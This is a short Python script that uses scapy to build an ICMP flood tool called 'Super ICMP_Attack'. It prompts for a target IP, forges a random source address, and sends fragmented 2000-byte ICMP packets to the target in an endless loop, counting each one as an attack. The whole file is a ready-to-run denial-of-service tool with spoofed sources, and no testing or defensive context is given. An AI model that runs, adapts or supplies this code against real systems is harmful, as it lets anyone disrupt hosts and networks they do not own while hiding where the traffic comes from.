
import scapy.all as scapy
import time
import os

def Ping_attack():

	clear = os.system('clear')

	print("**************************************")
	print("         Super ICMP_Attack")
	print("**************************************")
	print("please input your attack target's IP")
	target = input("[Super ICMP_attack]#")
	srcip = scapy.RandIP()

	attack_numbers=0
	try:
		while True:
			packet = scapy.fragment(scapy.IP(src=srcip,dst=target)/scapy.ICMP()/("X"*2000))
			scapy.send(packet,verbose=False)
			attack_numbers += 1
			print("[+]Attack Number is "+str(attack_numbers))
			time.sleep(2)
	except KeyboardInterrupt:
		print("[-]Ctrl + C detected.....")

Ping_attack()


